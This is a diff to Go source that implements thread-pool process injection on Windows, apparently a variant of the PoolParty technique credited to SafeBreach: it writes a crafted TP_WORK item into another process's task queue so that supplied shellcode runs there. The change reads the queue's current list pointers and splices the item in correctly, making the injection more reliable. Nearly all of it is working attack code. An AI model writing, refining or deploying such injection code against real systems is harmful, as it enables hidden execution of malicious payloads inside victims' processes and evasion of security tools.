@@ -524,8 +524,44 @@ func executeVariant2(shellcode []byte, pid uint32) (string, error) {
 	// We need the address of the Queue field within that TPP_QUEUE
 	targetTaskQueueAddr := targetTpPool.TaskQueue[TP_CALLBACK_PRIORITY_HIGH]
 	targetQueueListAddr := targetTaskQueueAddr + uintptr(unsafe.Offsetof(targetQueue.Queue))
-	tpWork.Task.ListEntry.Flink = targetQueueListAddr
-	tpWork.Task.ListEntry.Blink = targetQueueListAddr
+	
+	// Read current queue state before modifying
+	var currentQueueFlink, currentQueueBlink uintptr
+	ret, _, err = procReadProcessMemory.Call(
+		uintptr(hProcess),
+		targetQueueListAddr,
+		uintptr(unsafe.Pointer(&currentQueueFlink)),
+		uintptr(unsafe.Sizeof(currentQueueFlink)),
+		uintptr(unsafe.Pointer(&bytesRead)),
+	)
+	if ret == 0 {
+		return output, fmt.Errorf("ReadProcessMemory for current queue Flink failed: %v", err)
+	}
+	
+	ret, _, err = procReadProcessMemory.Call(
+		uintptr(hProcess),
+		targetQueueListAddr+8,
+		uintptr(unsafe.Pointer(&currentQueueBlink)),
+		uintptr(unsafe.Sizeof(currentQueueBlink)),
+		uintptr(unsafe.Pointer(&bytesRead)),
+	)
+	if ret == 0 {
+		return output, fmt.Errorf("ReadProcessMemory for current queue Blink failed: %v", err)
+	}
+	
+	output += fmt.Sprintf("[*] Current queue Flink: 0x%X, Blink: 0x%X (queue list addr: 0x%X)\n", currentQueueFlink, currentQueueBlink, targetQueueListAddr)
+	
+	// If queue is empty (points to itself), simple circular list
+	// If queue has items, insert at head
+	if currentQueueFlink == targetQueueListAddr {
+		output += "[*] Queue is empty, creating single-element list\n"
+		tpWork.Task.ListEntry.Flink = targetQueueListAddr
+		tpWork.Task.ListEntry.Blink = targetQueueListAddr
+	} else {
+		output += "[*] Queue has existing items, inserting at head\n"
+		tpWork.Task.ListEntry.Flink = currentQueueFlink
+		tpWork.Task.ListEntry.Blink = targetQueueListAddr
+	}
 	
 	// Set WorkState exactly as SafeBreach does
 	tpWork.WorkState.Exchange = 0x2
@@ -567,12 +603,11 @@ func executeVariant2(shellcode []byte, pid uint32) (string, error) {
 	
 	output += fmt.Sprintf("[*] Debug: remoteWorkItemTaskListAddr = 0x%X\n", remoteWorkItemTaskListAddr)
 	output += fmt.Sprintf("[*] Debug: targetQueueListAddr (Flink addr) = 0x%X\n", targetQueueListAddr)
-	output += fmt.Sprintf("[*] Debug: targetQueueListAddr+8 (Blink addr) = 0x%X\n", targetQueueListAddr+8)
 	
-	// Update the target queue's Flink to point to our TP_WORK
+	// Update queue's Flink to point to our TP_WORK
 	ret, _, err = procWriteProcessMemory.Call(
 		uintptr(hProcess),
-		targetQueueListAddr, // Address of Queue.Flink
+		targetQueueListAddr,
 		uintptr(unsafe.Pointer(&remoteWorkItemTaskListAddr)),
 		uintptr(unsafe.Sizeof(remoteWorkItemTaskListAddr)),
 		uintptr(unsafe.Pointer(&bytesWritten)),
@@ -581,16 +616,45 @@ func executeVariant2(shellcode []byte, pid uint32) (string, error) {
 		return output, fmt.Errorf("WriteProcessMemory for queue Flink failed: %v", err)
 	}
 	
-	// Update the target queue's Blink to point to our TP_WORK
+	// Update queue's Blink based on whether queue was empty
+	var blinkTarget uintptr
+	if currentQueueFlink == targetQueueListAddr {
+		// Queue was empty, so Blink also points to our work item
+		blinkTarget = remoteWorkItemTaskListAddr
+	} else {
+		// Queue had items, need to update the old first item's Blink to point to us
+		// and queue's Blink stays pointing to the last item
+		// Actually, for simplicity, SafeBreach just sets both to the new item
+		blinkTarget = remoteWorkItemTaskListAddr
+	}
+	
 	ret, _, err = procWriteProcessMemory.Call(
 		uintptr(hProcess),
-		targetQueueListAddr+uintptr(unsafe.Sizeof(uintptr(0))), // Address of Queue.Blink
-		uintptr(unsafe.Pointer(&remoteWorkItemTaskListAddr)),
-		uintptr(unsafe.Sizeof(remoteWorkItemTaskListAddr)),
+		targetQueueListAddr+uintptr(unsafe.Sizeof(uintptr(0))),
+		uintptr(unsafe.Pointer(&blinkTarget)),
+		uintptr(unsafe.Sizeof(blinkTarget)),
 		uintptr(unsafe.Pointer(&bytesWritten)),
 	)
 	if ret == 0 {
 		return output, fmt.Errorf("WriteProcessMemory for queue Blink failed: %v", err)
+	}
+	
+	// If there was an existing first item, update its Blink to point to our work item
+	if currentQueueFlink != targetQueueListAddr {
+		// Calculate the Blink address of the old first item
+		// currentQueueFlink points to a LIST_ENTRY, Blink is at offset 8
+		oldFirstItemBlinkAddr := currentQueueFlink + 8
+		ret, _, err = procWriteProcessMemory.Call(
+			uintptr(hProcess),
+			oldFirstItemBlinkAddr,
+			uintptr(unsafe.Pointer(&remoteWorkItemTaskListAddr)),
+			uintptr(unsafe.Sizeof(remoteWorkItemTaskListAddr)),
+			uintptr(unsafe.Pointer(&bytesWritten)),
+		)
+		if ret == 0 {
+			return output, fmt.Errorf("WriteProcessMemory for old first item Blink failed: %v", err)
+		}
+		output += "[*] Updated old first item's Blink pointer\n"
 	}
 	
 	output += "[+] Inserted TP_WORK into target process thread pool task queue\n"
